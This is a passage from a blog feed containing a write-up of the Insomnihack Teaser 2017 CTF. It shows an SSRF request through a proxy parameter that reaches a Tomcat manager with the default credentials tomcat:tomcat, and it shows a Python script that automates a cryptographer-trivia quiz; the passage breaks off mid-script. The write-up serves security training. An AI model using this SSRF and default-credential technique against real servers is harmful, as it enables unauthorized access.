solution yet (mostly for commit from browser).&lt;/p&gt;</content><category term="programming"></category><category term="programming"></category><category term="devops"></category></entry><entry><title>Insomnihack Teaser 2017</title><link href="https://maggick.fr/2017/01/insomnihack-teaser-2017.html" rel="alternate"></link><published>2017-01-22T22:00:00+01:00</published><updated>2017-01-22T22:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2017-01-22:/2017/01/insomnihack-teaser-2017.html</id><summary type="html">&lt;p&gt;This week-end was the insomnihack teaser CTF. I participated with the team
&lt;strong&gt;The Half Crunchy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The theme was "RISE OF THE MACHINES" with rogue webserver and flawing cat robot.&lt;/p&gt;
&lt;p&gt;We finished 42th with 550 points flagging 5 challenges:&lt;/p&gt;
&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#smarttomcat"&gt;Smarttomcat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#cryptquizz"&gt;Cryptquizz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shobot"&gt;Shobot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-great-escape-part-1"&gt;The great escape - part 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-great-escape-part-2"&gt;The great escape - part 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#disqus-comments"&gt;Disqus comments&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img alt="scoreboard" src="/media/2017.01/scoreboard.png"/&gt;&lt;/p&gt;
&lt;p&gt;Many thanks to the organisation! It was a really nice CTF.&lt;/p&gt;
&lt;p&gt;Thanks to all team members who participated.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;This week-end was the insomnihack teaser CTF. I participated with the team
&lt;strong&gt;The Half Crunchy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The theme was "RISE OF THE MACHINES" with rogue webserver and flawing cat robot.&lt;/p&gt;
&lt;p&gt;We finished 42th with 550 points flagging 5 challenges:&lt;/p&gt;
&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#smarttomcat"&gt;Smarttomcat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#cryptquizz"&gt;Cryptquizz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shobot"&gt;Shobot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-great-escape-part-1"&gt;The great escape - part 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-great-escape-part-2"&gt;The great escape - part 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#disqus-comments"&gt;Disqus comments&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img alt="scoreboard" src="/media/2017.01/scoreboard.png"&gt;&lt;/p&gt;
&lt;p&gt;Many thanks to the organisation! It was a really nice CTF.&lt;/p&gt;
&lt;p&gt;Thanks to all team members who participated.&lt;/p&gt;


&lt;h2 id="smarttomcat"&gt;Smarttomcat&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart
tomcat robot.&lt;/p&gt;
&lt;p&gt;Now the damn thing has attacked me and flew away. I can't even seem to track it
down on the broken search interface... Can you help me ?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The web site let you enter coordinate where you may think the cat is.&lt;/p&gt;
&lt;p&gt;&lt;img alt="smarttomact screenshot" src="/media/2017.01/site.png"&gt;&lt;/p&gt;
&lt;p&gt;When intercepting the traffic with Burp we see that the request look like the
following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;smarttomcat.teaser.insomnihack.ch&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded; charset=UTF-8&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://smarttomcat.teaser.insomnihack.ch/&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;61&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;u=http%3A%2F%2Flocalhost%3A8080%2Findex.jsp%3Fx%3D42%26y%3D42&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We notice the &lt;code&gt;u&lt;/code&gt; parameter which decoded is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://localhost:8080/index.jsp?x=42&amp;amp;y=42&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The server is using itself as a proxy, When modifying the request with a &lt;code&gt;lol&lt;/code&gt;,
the &lt;code&gt;u&lt;/code&gt; parameter is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;u=http%3A%2F%2Flocalhost%3A8080%2Flol&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The server response is an error which indicate us that the server is using a
tomcat server 7.0.68.&lt;/p&gt;
&lt;p&gt;&lt;img alt="testing a bad request" src="/media/2017.01/lol.png"&gt;&lt;/p&gt;
&lt;p&gt;We learned that this is a tomcat server, so let's see if we can get the manager:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="authentication error on tomcat manager" src="/media/2017.01/manager.png"&gt;&lt;/p&gt;
&lt;p&gt;Tomcat manager used a HTTP basic auth, and we can authenticate with a URL looking
like &lt;code&gt;http://username:password@site.com&lt;/code&gt; so with the following parameter we test
the default user and password for tomcat manager:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nl"&gt;Ftomcat&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;tomcat&lt;/span&gt;&lt;span class="nv"&gt;@localhost&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;A8080&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;Fmanager&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The response is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;We won&amp;#39;t give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="cryptquizz"&gt;Cryptquizz&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to
prove us that you are a genuine cryptographer.&lt;/p&gt;
&lt;p&gt;Running on quizz.teaser.insomnihack.ch:1031&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This challenge is a series of questions regarding year of birth of different
cryptographers.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@eridani ~]$ nc quizz.teaser.insomnihack.ch 1031&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;~~ Hello, young hacker. Are you ready to fight rogue machines ?    ~~&lt;/span&gt;
&lt;span class="code-line"&gt;~~ Now, you&amp;#39;ll have to prove us that you are a genuine             ~~&lt;/span&gt;
&lt;span class="code-line"&gt;~~ cryptographer.                                                  ~~&lt;/span&gt;
&lt;span class="code-line"&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;~~ What is the birth year of Ronald Cramer ?&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In order to obtain the flag it is necessary to automated the process. This is
quit simple in python but a bit repetitive.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pexpect&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;child&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pexpect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;telnet quizz.teaser.insomnihack.ch 1031&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;question&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Alan Turing&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Amit Sahai&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bruce &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Schneier&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Claude&lt;/span&gt; &lt;span class="n"&gt;Shannon&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Claus&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Peter&lt;/span&gt; &lt;span class="n"&gt;Schnorr&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Dan&lt;/span&gt; &lt;span class="n"&gt;Boneh&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Daniel&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Bleichenbacher&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Daniel&lt;/span&gt; &lt;span class="n"&gt;J&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Bernstein&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;David&lt;/span&gt; &lt;span class="n"&gt;Chaum&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Donald&lt;/span&gt; &lt;span class="n"&gt;Davies&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Don&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Coppersmith&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Douglas&lt;/span&gt; &lt;span class="n"&gt;Stinson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Eli&lt;/span&gt; &lt;span class="n"&gt;Biham&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Gilles&lt;/span&gt; &lt;span class="n"&gt;Brassard&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Horst&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Feistel&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ivan&lt;/span&gt; &lt;span class="n"&gt;Damgard&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Jacques&lt;/span&gt; &lt;span class="n"&gt;Stern&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Jean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Jacques&lt;/span&gt; &lt;span class="n"&gt;Quisquater&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Jim&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Massey&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Joan&lt;/span&gt; &lt;span class="n"&gt;Daemen&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Markus&lt;/span&gt; &lt;span class="n"&gt;Jakobsson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Martin&lt;/span&gt; &lt;span class="n"&gt;Hellman&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Michael&lt;/span&gt; &lt;span class="n"&gt;O&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Rabin&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Mihir&lt;/span&gt; &lt;span class="n"&gt;Bellare&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Mitsuru&lt;/span&gt; &lt;span class="n"&gt;Matsui&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Moni&lt;/span&gt; &lt;span class="n"&gt;Naor&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Neal&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Koblitz&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Niels&lt;/span&gt; &lt;span class="n"&gt;Ferguson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Nigel&lt;/span&gt; &lt;span class="n"&gt;P&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Smart&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Paul&lt;/span&gt; &lt;span class="n"&gt;Kocher&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Paulo&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Barreto&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Rafail&lt;/span&gt; &lt;span class="n"&gt;Ostrovsky&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ralph&lt;/span&gt; &lt;span class="n"&gt;Merkle&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ronald&lt;/span&gt; &lt;span class="n"&gt;Cramer&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ron&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Rivest&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ross&lt;/span&gt; &lt;span class="n"&gt;Anderson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Scott&lt;/span&gt; &lt;span class="n"&gt;Vanstone&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Serge&lt;/span&gt; &lt;span class="n"&gt;Vaudenay&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Shafi&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Goldwasser&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Shai&lt;/span&gt; &lt;span class="n"&gt;Halevi&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Taher&lt;/span&gt; &lt;span class="n"&gt;Elgamal&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Tatsuaki&lt;/span&gt; &lt;span class="n"&gt;Okamoto&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ueli&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Maurer&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Victor&lt;/span&gt; &lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Miller&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Vincent&lt;/span&gt; &lt;span class="n"&gt;Rijmen&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Wang&lt;/span&gt; &lt;span class="n"&gt;Xiaoyun&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Whitfield&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Diffie&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Xuejia&lt;/span&gt; &lt;span class="n"&gt;Lai&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Yehuda&lt;/span&gt; &lt;span class="n"&gt;Lindell&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Yvo&lt;/span&gt; &lt;span class="n"&gt;Desmedt&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Kaisa&lt;/span&gt; &lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nyberg&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Rafail&lt;/span&gt; &lt;span class="n"&gt;Ostrovsky&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Adi&lt;/span&gt; &lt;span class="n"&gt;Shamir&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1912&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1974&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1963&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1916&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1943&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1969&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1964&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
